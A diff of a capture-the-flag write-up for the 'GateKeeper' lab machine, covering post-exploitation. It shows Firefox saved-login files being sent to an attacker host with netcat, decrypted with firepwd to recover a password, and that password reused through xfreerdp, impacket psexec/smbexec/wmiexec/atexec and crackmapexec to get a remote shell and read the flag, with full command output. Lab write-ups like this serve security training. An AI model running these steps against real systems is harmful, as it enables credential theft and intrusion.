@@ -455,12 +455,16 @@ It was widely known that credentials can be obtained from firefox, so searching 
 
 Script for decryptor 
 ```
-sudo git clone https://github.com/unode/firefox_decrypt/   
+git clone https://github.com/lclevy/firepwd.git 
 ```
 Files required are located in:
 ```
 C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
 ```
+Note files directly download without metasploit worked ones with metasploit were all larger and failed to decrypt and threw error - couldn't initialize NSS - directory-of-files. I think this was due to the decryptor being newer AES not with DES, required for this decryption.
+
+### The following method downloaded files that did not fail on decryption.
+
 Netcat was uploaded with certutil in documents folder of natbat. Then used to upload files to attack PC for decryption:
 Where in most default kali install nc.exe is installed at:
 ```
@@ -474,8 +478,58 @@ C:\Users\natbat\Documents>nc.exe -nv Attacker_IP PORT < logins.json
 ```
 Then process the files downloaded with decrytor:
 ```
-python3 firefox_decrypt.py ./gatekeeper_firefox
+$ python firepwd.py -d /mnt/CTF/GateKeeper      
+....
+decrypting login/password pairs
+Using 3DES (32-byte key, truncated to 24)
+   https://creds.com:b'mayor',b'8CL7O1N78MdrCIsV'
 ```
+## Now obtain the root.txt
+
+Use mayor creds to obtain root.txt from desktop
+xfreerdpway:
+```
+xfreerdp /v:10.48.154.184 /u:mayor /p:8CL7O1N78MdrCIsV /cert:ignore
+# need full screen and window will likely need zoom out and slide windows over to left to click ok button. Then its right on desktop
+```
+here are several other options that were preinstalled that SMBexec tried and works, no time to test others. 
+```
+python3 /usr/share/doc/python3-impacket/examples/psexec.py gatekeeper/mayor:PASS@IP
+python3 /usr/share/doc/python3-impacket/examples/wmiexec.py gatekeeper/mayor:PASS@IP
+python3 /usr/share/doc/python3-impacket/examples/smbexec.py gatekeeper/mayor:PASS@IP
+python3 /usr/share/doc/python3-impacket/examples/atexec.py gatekeeper/mayor:PASS@IP "cmd.exe"
+```
+crackmapexec is good for one line commands whie common commands like whoami often fail.
+```
+root@ip-10-48-121-35:/# crackmapexec smb 10.48.154.184 -u mayor -p '8CL7O1N78MdrCIsV' --exec-method atexec -x "type c:\users\mayor\desktop\root.txt.txt"
+SMB         10.48.154.184   445    GATEKEEPER       [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:GATEKEEPER) (domain:gatekeeper) (signing:False) (SMBv1:True)
+SMB         10.48.154.184   445    GATEKEEPER       [+] gatekeeper\mayor:8CL7O1N78MdrCIsV (Pwn3d!)
+SMB         10.48.154.184   445    GATEKEEPER       [+] Executed command via atexec
+SMB         10.48.154.184   445    GATEKEEPER       {Th3_M4y0r_C0ngr4tul4t3s_U}
+root@ip-10-48-121-35:/# 
+```
+psexec.py no issues its also in impacket
+/opt/impacket/build/scripts-3.9/psexec.py
+
+```
+root@ip-10-48-121-35:/# python3 /usr/local/bin/psexec.py gatekeeper/mayor:8CL7O1N78MdrCIsV@10.48.154.184
+Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
+
+[*] Requesting shares on 10.48.154.184.....
+[*] Found writable share ADMIN$
+[*] Uploading file HFcsfIdz.exe
+[*] Opening SVCManager on 10.48.154.184.....
+[*] Creating service AcEK on 10.48.154.184.....
+[*] Starting service AcEK.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> type c:\users\mayor\desktop\root.txt.txt
+{Th3_M4y0r_C0ngr4tul4t3s_U}
+C:\Windows\system32> 
+```
+
 
 ## Metasploitable way instead
 Alternatively and a lot easier use the meterpreter shell in the payload used for initial shell connection with exploit/multi/handler listener to catch it.
